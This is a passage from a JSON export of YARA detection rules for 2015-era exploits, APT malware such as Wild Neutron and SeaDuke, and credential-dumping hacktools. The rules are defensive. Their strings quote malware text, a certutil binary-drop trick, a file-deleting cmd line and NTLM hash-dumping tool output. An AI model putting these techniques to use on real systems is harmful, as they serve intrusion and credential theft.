10:27:31","description":"MS15-078 / MS15-077 exploit - generic signature","minimum_yara":"1.7","name":"Exploit_MS15_077_078_RID2D56","reference":"https://code.google.com/p/google-security-research/issues/detail?id=473&can=1&start=200","required_modules":[],"rule_hash":"3bf5393f5551de8d98c60ae0dea9ea9b","score":75,"tags":["EXPLOIT","DEMO","EXE","T1189","FILE"]},{"author":"Florian Roth","content":"rule Exploit_MS15_077_078_HackingTeam_RID31F1 : DEMO EXE EXPLOIT FILE T1189 {\n   meta:\n      description = \"MS15-078 / MS15-077 exploit - Hacking Team code\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2015-07-21 13:44:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, EXPLOIT, FILE, T1189\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\SystemRoot\\\\system32\\\\CI.dll\" fullword ascii\n      $s2 = \"\\\\sysnative\\\\CI.dll\" fullword ascii\n      $s3 = \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36\" fullword ascii\n      $s4 = \"CRTDLL.DLL\" fullword ascii\n      $s5 = \"\\\\sysnative\" fullword ascii\n      $s6 = \"InternetOpenA coolio, trying open %s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2500KB and 5 of them\n}","date":"2015-07-21 13:44:01","description":"MS15-078 / MS15-077 exploit - Hacking Team code","minimum_yara":"1.7","name":"Exploit_MS15_077_078_HackingTeam_RID31F1","reference":"-","required_modules":[],"rule_hash":"6a330fce9d69063a7257053ea1163d1d","score":75,"tags":["EXPLOIT","DEMO","EXE","T1189","FILE"]},{"author":"Florian Roth","content":"rule MAL_Malicious_SFX1_Voicemail_RID3169 : DEMO FILE MAL {\n   meta:\n      description = \"SFX with voicemail content\"\n      author = \"Florian Roth\"\n      reference = \"http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3950\"\n      date = \"2015-07-20 13:21:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"voicemail\" ascii\n      $s1 = \".exe\" ascii\n   condition: \n      uint16 ( 0 ) == 0x4b50 and filesize < 1000KB and $s0 in ( 3 .. 80 ) and $s1 in ( 3 .. 80 )\n}","date":"2015-07-20 13:21:21","description":"SFX with voicemail content","minimum_yara":"1.7","name":"MAL_Malicious_SFX1_Voicemail_RID3169","reference":"http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3950","required_modules":[],"rule_hash":"d88d47919b0ee26a0ffbed2a56558725","score":75,"tags":["DEMO","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_MiniDionis_readerView_RID30AA : DEMO EXE FILE MAL {\n   meta:\n      description = \"MiniDionis Malware - file readerView.exe / adobe.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3950\"\n      date = \"2015-07-20 12:49:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%ws_out%ws\" fullword wide\n      $s2 = \"dnlibsh\" fullword ascii\n      $op0 = { 0f b6 80 68 0e 41 00 0b c8 c1 e1 08 0f b6 c2 8b } \n      $op1 = { 8b ce e8 f8 01 00 00 85 c0 74 41 83 7d f8 00 0f } \n      $op2 = { e8 2f a2 ff ff 83 20 00 83 c8 ff 5f 5e 5d c3 55 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of ( $s* ) and 1 of ( $op* )\n}","date":"2015-07-20 12:49:31","description":"MiniDionis Malware - file readerView.exe / adobe.exe","minimum_yara":"1.7","name":"MAL_MiniDionis_readerView_RID30AA","reference":"http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3950","required_modules":[],"rule_hash":"aa49afd0998b8fa048f32605c352581c","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_Malicious_SFX2_Adobe_RID2FAC : DEMO EXE FILE MAL {\n   meta:\n      description = \"SFX with adobe.exe content\"\n      author = \"Florian Roth\"\n      reference = \"http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3950\"\n      date = \"2015-07-20 12:07:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"adobe.exe\" fullword ascii\n      $s2 = \"Extracting files to %s folder$Extracting files to temporary folder\" fullword wide\n      $s3 = \"GETPASSWORD1\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them\n}","date":"2015-07-20 12:07:11","description":"SFX with adobe.exe content","minimum_yara":"1.7","name":"MAL_Malicious_SFX2_Adobe_RID2FAC","reference":"http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3950","required_modules":[],"rule_hash":"38ad418f21b5b45e0929a2efe232ddb3","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Binary_Drop_Certutil_RID2F15 : DEMO SUSP T1132 T1140 {\n   meta:\n      description = \"Drop binary as base64 encoded cert trick\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/9DNn8q\"\n      date = \"2015-07-15 11:42:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP, T1132, T1140\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"echo -----BEGIN CERTIFICATE----- >\" ascii\n      $s1 = \"echo -----END CERTIFICATE----- >>\" ascii\n      $s2 = \"certutil -decode \" ascii\n   condition: \n      filesize < 10KB and all of them\n}","date":"2015-07-15 11:42:01","description":"Drop binary as base64 encoded cert trick","minimum_yara":"1.7","name":"Binary_Drop_Certutil_RID2F15","reference":"https://goo.gl/9DNn8q","required_modules":[],"rule_hash":"d502940b293d654bdeee13591b073b9d","score":70,"tags":["SUSP","DEMO","T1132","T1140"]},{"author":"Florian Roth","content":"rule AppInitHook_RID2B57 : DEMO EXE FILE HKTL T1003 T1075 T1097 T1178 {\n   meta:\n      description = \"AppInitGlobalHooks-Mimikatz - Hide Mimikatz From Process Lists - file AppInitHook_RID2B57.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/Z292v6\"\n      date = \"2015-07-15 09:02:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1003, T1075, T1097, T1178\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\Release\\\\AppInitHook_RID2B57.pdb\" ascii\n      $s1 = \"AppInitHook_RID2B57.dll\" fullword ascii\n      $s2 = \"mimikatz.exe\" fullword wide\n      $s3 = \"]X86Instruction->OperandSize >= Operand->Length\" fullword wide\n      $s4 = \"mhook\\\\disasm-lib\\\\disasm.c\" fullword wide\n      $s5 = \"mhook\\\\disasm-lib\\\\disasm_x86.c\" fullword wide\n      $s6 = \"VoidFunc\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 4 of them\n}","date":"2015-07-15 09:02:21","description":"AppInitGlobalHooks-Mimikatz - Hide Mimikatz From Process Lists - file AppInitHook.dll","minimum_yara":"1.7","name":"AppInitHook_RID2B57","reference":"https://goo.gl/Z292v6","required_modules":[],"rule_hash":"d1019ac2912b8dc185a884d738c56031","score":70,"tags":["T1178","T1097","T1075","DEMO","T1003","FILE","EXE","HKTL"]},{"author":"Florian Roth","content":"rule MAL_SeaDuke_Sample_RID2DAD : DEMO EXE FILE MAL RUSSIA {\n   meta:\n      description = \"SeaDuke Malware - file 3eb86b7b067c296ef53e4857a74e09f12c2b84b666fc130d1f58aec18bc74b0d\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/MJ0c2M\"\n      date = \"2015-07-14 10:42:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"bpython27.dll\" fullword ascii\n      $s1 = \"email.header(\" fullword ascii\n      $s2 = \"LogonUI.exe\" fullword wide\n      $s3 = \"Crypto.Cipher.AES(\" fullword ascii\n      $s4 = \"mod is NULL - %s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and all of them\n}","date":"2015-07-14 10:42:01","description":"SeaDuke Malware - file 3eb86b7b067c296ef53e4857a74e09f12c2b84b666fc130d1f58aec18bc74b0d","minimum_yara":"1.7","name":"MAL_SeaDuke_Sample_RID2DAD","reference":"http://goo.gl/MJ0c2M","required_modules":[],"rule_hash":"d8999772c91dd2950801b5b270f91c2d","score":75,"tags":["DEMO","RUSSIA","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule WildNeutron_Sample_1_RID2EDD : APT DEMO EXE FILE {\n   meta:\n      description = \"Wild Neutron APT Sample Rule - file 2b5065a3d0e0b8252a987ef5f29d9e1935c5863f5718b83440e68dc53c21fa94\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n      date = \"2015-07-10 11:32:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"LiveUpdater.exe\" fullword wide\n      $s1 = \"id-at-postalAddress\" fullword ascii\n      $s2 = \"%d -> %d (default)\" fullword wide\n      $s3 = \"%s%s%s=%d,%s=%d,%s=%d,\" fullword wide\n      $s8 = \"id-ce-keyUsage\" fullword ascii\n      $s9 = \"Key Usage\" fullword ascii\n      $s32 = \"UPDATE_ID\" fullword wide\n      $s37 = \"id-at-commonName\" fullword ascii\n      $s38 = \"2008R2\" fullword wide\n      $s39 = \"RSA-alt\" fullword ascii\n      $s40 = \"%02d.%04d.%s\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and all of them\n}","date":"2015-07-10 11:32:41","description":"Wild Neutron APT Sample Rule - file 2b5065a3d0e0b8252a987ef5f29d9e1935c5863f5718b83440e68dc53c21fa94","minimum_yara":"1.7","name":"WildNeutron_Sample_1_RID2EDD","reference":"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/","required_modules":[],"rule_hash":"152c96b723a1d3025e369fb52063ce6f","score":60,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule WildNeutron_Sample_2_RID2EDE : APT DEMO EXE FILE T1085 {\n   meta:\n      description = \"Wild Neutron APT Sample Rule - file 8d80f9ef55324212759f4b6070cb8fce18a008ae9dd8b9598553206654d13a6f\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n      date = \"2015-07-10 11:32:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1085\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"rundll32.exe \\\"%s\\\",#1\" fullword wide\n      $s1 = \"IgfxUpt.exe\" fullword wide\n      $s2 = \"id-at-postalAddress\" fullword ascii\n      $s3 = \"Intel(R) Common User Interface\" fullword wide\n      $s4 = \"%s%s%s=%d,%s=%d,%s=%d,\" fullword wide\n      $s11 = \"Key Usage\" fullword ascii\n      $s12 = \"Intel Integrated Graphics Updater\" fullword wide\n      $s13 = \"%sexpires on    : %04d-%02d-%02d %02d:%02d:%02d\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and all of them\n}","date":"2015-07-10 11:32:51","description":"Wild Neutron APT Sample Rule - file 8d80f9ef55324212759f4b6070cb8fce18a008ae9dd8b9598553206654d13a6f","minimum_yara":"1.7","name":"WildNeutron_Sample_2_RID2EDE","reference":"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/","required_modules":[],"rule_hash":"50b5f9f5ea47c1263db73377013de8ef","score":60,"tags":["APT","T1085","EXE","DEMO","FILE"]},{"author":"Florian Roth","content":"rule WildNeutron_Sample_4_RID2EE0 : APT DEMO EXE FILE T1085 {\n   meta:\n      description = \"Wild Neutron APT Sample Rule - file b4005530193bc523d3e0193c3c53e2737ae3bf9f76d12c827c0b5cd0dcbaae45\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n      date = \"2015-07-10 11:33:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1085\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"WinRAT-Win32-Release.exe\" fullword ascii\n      $s0 = \"rundll32.exe \\\"%s\\\",#1\" fullword wide\n      $s1 = \"RtlUpd.EXE\" fullword wide\n      $s2 = \"RtlUpd.exe\" fullword wide\n      $s3 = \"Driver Update and remove for Windows x64 or x86_32\" fullword wide\n      $s4 = \"Realtek HD Audio Update and remove driver Tool\" fullword wide\n      $s5 = \"%s%s%s=%d,%s=%d,%s=%d,\" fullword wide\n      $s6 = \"Key Usage\" fullword ascii\n      $s7 = \"id-at-serialNumber\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1240KB and all of them\n}","date":"2015-07-10 11:33:11","description":"Wild Neutron APT Sample Rule - file b4005530193bc523d3e0193c3c53e2737ae3bf9f76d12c827c0b5cd0dcbaae45","minimum_yara":"1.7","name":"WildNeutron_Sample_4_RID2EE0","reference":"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/","required_modules":[],"rule_hash":"ee94174890bee2674650b207cd689a80","score":60,"tags":["APT","T1085","EXE","DEMO","FILE"]},{"author":"Florian Roth","content":"rule WildNeutron_Sample_5_RID2EE1 : APT DEMO EXE FILE {\n   meta:\n      description = \"Wild Neutron APT Sample Rule - file 1604e36ccef5fa221b101d7f043ad7f856b84bf1a80774aa33d91c2a9a226206\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n      date = \"2015-07-10 11:33:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"LiveUpdater.exe\" fullword wide\n      $s1 = \"id-at-postalAddress\" fullword ascii\n      $s2 = \"%d -> %d (default)\" fullword wide\n      $s3 = \"%s%s%s=%d,%s=%d,%s=%d,\" fullword wide\n      $s4 = \"sha-1WithRSAEncryption\" fullword ascii\n      $s5 = \"Postal code\" fullword ascii\n      $s6 = \"id-ce-keyUsage\" fullword ascii\n      $s7 = \"Key Usage\" fullword ascii\n      $s8 = \"TLS-RSA-WITH-3DES-EDE-CBC-SHA\" fullword ascii\n      $s9 = \"%02d.%04d.%s\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them\n}","date":"2015-07-10 11:33:21","description":"Wild Neutron APT Sample Rule - file 1604e36ccef5fa221b101d7f043ad7f856b84bf1a80774aa33d91c2a9a226206","minimum_yara":"1.7","name":"WildNeutron_Sample_5_RID2EE1","reference":"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/","required_modules":[],"rule_hash":"1251806a41c60057fc34d2da10b9d63d","score":60,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule WildNeutron_Sample_6_RID2EE2 : APT DEMO EXE FILE {\n   meta:\n      description = \"Wild Neutron APT Sample Rule - file 4bd548fe07b19178281edb1ee81c9711525dab03dc0b6676963019c44cc75865\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n      date = \"2015-07-10 11:33:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"mshtaex.exe\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 310KB and all of them\n}","date":"2015-07-10 11:33:31","description":"Wild Neutron APT Sample Rule - file 4bd548fe07b19178281edb1ee81c9711525dab03dc0b6676963019c44cc75865","minimum_yara":"1.7","name":"WildNeutron_Sample_6_RID2EE2","reference":"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/","required_modules":[],"rule_hash":"5f2f17e3406a71e8486b3cd845666ff3","score":60,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule WildNeutron_Sample_7_RID2EE3 : APT DEMO EXE FILE {\n   meta:\n      description = \"Wild Neutron APT Sample Rule - file a14d31eb965ea8a37ebcc3b5635099f2ca08365646437c770212d534d504ff3c\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n      date = \"2015-07-10 11:33:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"checking match for '%s' user %s host %s addr %s\" fullword ascii\n      $s1 = \"PEM_read_bio_PrivateKey failed\" fullword ascii\n      $s2 = \"usage: %s [-ehR] [-f log_facility] [-l log_level] [-u umask]\" fullword ascii\n      $s3 = \"%s %s for %s%.100s from %.200s port %d%s\" fullword ascii\n      $s4 = \"clapi32.dll\" fullword ascii\n      $s5 = \"Connection from %s port %d\" fullword ascii\n      $s6 = \"/usr/etc/ssh_known_hosts\" fullword ascii\n      $s7 = \"Version: %s - %s %s %s %s\" fullword ascii\n      $s8 = \"[-] connect()\" fullword ascii\n      $s9 = \"/bin/sh /usr/etc/sshrc\" fullword ascii\n      $s10 = \"kexecdhs.c\" fullword ascii\n      $s11 = \"%s: setrlimit(RLIMIT_FSIZE, { 0, 0 }): %s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and all of them\n}","date":"2015-07-10 11:33:41","description":"Wild Neutron APT Sample Rule - file a14d31eb965ea8a37ebcc3b5635099f2ca08365646437c770212d534d504ff3c","minimum_yara":"1.7","name":"WildNeutron_Sample_7_RID2EE3","reference":"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/","required_modules":[],"rule_hash":"7e8a9b9408ca77637aacdd8083adb770","score":60,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule subTee_nativecmd_RID2D93 : APT DEMO EXE FILE {\n   meta:\n      description = \"NativeCmd - used by various threat groups\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n      date = \"2015-07-10 10:37:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"RunFile: couldn't load SHELL32.DLL!\" ascii wide\n      $x2 = \"RunFile: couldn't find ShellExecuteExA/W in SHELL32.DLL!\" fullword ascii\n      $x3 = \"Error executing CreateProcess()!!\" fullword wide\n      $x4 = \"cmdcmdline\" fullword wide\n      $x5 = \"Invalid input handle!!!\" fullword ascii\n      $s1 = \"Process %d terminated\" fullword wide\n      $s2 = \"Process is not running any more\" fullword wide\n      $s3 = \"javacpl.exe\" fullword wide\n      $s4 = \"Windows NT Version %lu.%lu\" fullword wide\n      $s5 = \"Usage: destination [reference]\" fullword wide\n      $s6 = \".com;.exe;.bat;.cmd\" fullword wide\n      $s7 = \") -%s-> %s (\" fullword ascii\n      $s8 = \"cmdextversion\" fullword wide\n      $s10 = \"\\\"%s\\\" /K %s\" fullword wide\n      $s12 = \"DEBUG: Cannot allocate memory for ptrNextNode->ptrNext!\" fullword ascii\n      $s13 = \"Failed to build full directory path\" fullword wide\n      $s14 = \"DEBUG: Cannot allocate memory for ptrFileArray!\" fullword ascii\n      $s15 = \"%-8s %-3s  %*s %s  %s\" fullword wide\n      $s16 = \" %%%c in (%s) do \" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and ( 2 of ( $x* ) or 6 of ( $s* ) )\n}","date":"2015-07-10 10:37:41","description":"NativeCmd - used by various threat groups","minimum_yara":"1.7","name":"subTee_nativecmd_RID2D93","reference":"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/","required_modules":[],"rule_hash":"fa3bc97508d5b59a667e73793141677e","score":40,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule WildNeutron_Sample_10_RID2F0D : APT DEMO EXE FILE {\n   meta:\n      description = \"Wild Neutron APT Sample Rule - file 1d3bdabb350ba5a821849893dabe5d6056bf7ba1ed6042d93174ceeaa5d6dad7\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n      date = \"2015-07-10 11:40:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $n1 = \"/c for /L %%i in (1,1,2) DO ping 127.0.0.1 -n 3 & type %%windir%%\\\\notepad.exe > %s & del /f %s\" fullword ascii\n      $s1 = \"%SYSTEMROOT%\\\\temp\\\\_dbg.tmp\" fullword ascii\n      $s2 = \"%SYSTEMROOT%\\\\SysWOW64\\\\mspool.dll\" fullword ascii\n      $s3 = \"%SYSTEMROOT%\\\\System32\\\\dpcore16t.dll\" fullword ascii\n      $s4 = \"%SYSTEMROOT%\\\\System32\\\\wdigestEx.dll\" fullword ascii\n      $s5 = \"%SYSTEMROOT%\\\\System32\\\\mspool.dll\" fullword ascii\n      $s6 = \"%SYSTEMROOT%\\\\System32\\\\kernel32.dll\" fullword ascii\n      $s7 = \"%SYSTEMROOT%\\\\SysWOW64\\\\iastor32.exe\" fullword ascii\n      $s8 = \"%SYSTEMROOT%\\\\System32\\\\msvcse.exe\" fullword ascii\n      $s9 = \"%SYSTEMROOT%\\\\System32\\\\mshtaex.exe\" fullword ascii\n      $s10 = \"%SYSTEMROOT%\\\\System32\\\\iastor32.exe\" fullword ascii\n      $s11 = \"%SYSTEMROOT%\\\\SysWOW64\\\\mshtaex.exe\" fullword ascii\n      $x1 = \"wdigestEx.dll\" fullword ascii\n      $x2 = \"dpcore16t.dll\" fullword ascii\n      $x3 = \"mspool.dll\" fullword ascii\n      $x4 = \"msvcse.exe\" fullword ascii\n      $x5 = \"mshtaex.exe\" fullword wide\n      $x6 = \"iastor32.exe\" fullword ascii\n      $y1 = \"Installer.exe\" fullword ascii\n      $y2 = \"Info: Process %s\" fullword ascii\n      $y3 = \"Error: GetFileTime %s 0x%x\" fullword ascii\n      $y4 = \"Install succeeded\" fullword ascii\n      $y5 = \"Error: RegSetValueExA 0x%x\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( $n1 or ( 1 of ( $s* ) and 1 of ( $x* ) and 3 of ( $y* ) ) )\n}","date":"2015-07-10 11:40:41","description":"Wild Neutron APT Sample Rule - file 1d3bdabb350ba5a821849893dabe5d6056bf7ba1ed6042d93174ceeaa5d6dad7","minimum_yara":"1.7","name":"WildNeutron_Sample_10_RID2F0D","reference":"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/","required_modules":[],"rule_hash":"837a18a90cf3a6e82c0febaab7f136bf","score":60,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule WildNeutron_javacpl_RID2ECC : APT DEMO EXE FILE {\n   meta:\n      description = \"Wild Neutron APT Sample Rule\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n      date = \"2015-07-10 11:29:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"javacpl.exe\" fullword wide\n      $s0 = \"RunFile: couldn't find ShellExecuteExA/W in SHELL32.DLL!\" fullword ascii\n      $s1 = \"Error executing CreateProcess()!!\" fullword wide\n      $s2 = \"http://www.java.com/en/download/installed.jsp?detect=jre\" fullword ascii\n      $s3 = \"RunFile: couldn't load SHELL32.DLL!\" fullword ascii\n      $s4 = \"Process is not running any more\" fullword wide\n      $s6 = \"Windows NT Version %lu.%lu\" fullword wide\n      $s7 = \"Usage: destination [reference]\" fullword wide\n      $s8 = \"Invalid input handle!!!\" fullword ascii\n      $s9 = \".com;.exe;.bat;.cmd\" fullword wide\n      $s10 = \") -%s-> %s (\" fullword ascii\n      $s11 = \"cmdextversion\" fullword wide\n      $s12 = \"Invalid pid (%s)\" fullword wide\n      $s13 = \"\\\"%s\\\" /K %s\" fullword wide\n      $s14 = \"Error setting %s (%s)\" fullword wide\n      $s16 = \"cmdcmdline\" fullword wide\n      $s39 = \"2008R2\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1677KB and all of them\n}","date":"2015-07-10 11:29:51","description":"Wild Neutron APT Sample Rule","minimum_yara":"1.7","name":"WildNeutron_javacpl_RID2ECC","reference":"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/","required_modules":[],"rule_hash":"52d4d7e377e37d0716fb729b0e6322a4","score":60,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule whosthere_alt_RID2C8A : APT DEMO EXE FILE {\n   meta:\n      description = \"Semiautomatic generated rule - file whosthere-alt.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n      date = \"2015-07-10 09:53:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"WHOSTHERE-ALT v1.1 - by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com) - (c) 2007-2008 Core Security Technologies\" fullword ascii\n      $s1 = \"whosthere enters an infinite loop and searches for new logon sessions every 2 seconds. Only new sessions are shown if found.\" fullword ascii\n      $s2 = \"dump output to a file, -o filename\" fullword ascii\n      $s3 = \"This tool lists the active LSA logon sessions with NTLM credentials.\" fullword ascii\n      $s4 = \"Error: pth.dll is not in the current directory!.\" fullword ascii\n      $s5 = \"the output format is: username:domain:lmhash:nthash\" fullword ascii\n      $s6 = \".\\\\pth.dll\" fullword ascii\n      $s7 = \"Cannot get LSASS.EXE PID!\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 280KB and 2 of them\n}","date":"2015-07-10 09:53:31","description":"Semiautomatic generated rule - file whosthere-alt.exe","minimum_yara":"1.7","name":"whosthere_alt_RID2C8A","reference":"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit","required_modules":[],"rule_hash":"c0b653aa3c93da9a794c63d5f0e8f8c4","score":80,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule iam_alt_iam_alt_RID2D1E : APT DEMO EXE FILE {\n   meta:\n      description = \"Semiautomatic generated rule - file iam-alt.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n      date = \"2015-07-10 10:18:11\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<cmd>. Create a new logon session and run a command with the specified credentials (e.g.: -r cmd.exe)\" fullword ascii\n      $s1 = \"IAM-ALT v1.1 - by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com) - (c) 2007-2008 Core Security Technologies\" fullword ascii\n      $s2 = \"This tool allows you to change the NTLM credentials of the current logon session\" fullword ascii\n      $s3 = \"username:domainname:lmhash:nthash\" fullword ascii\n      $s4 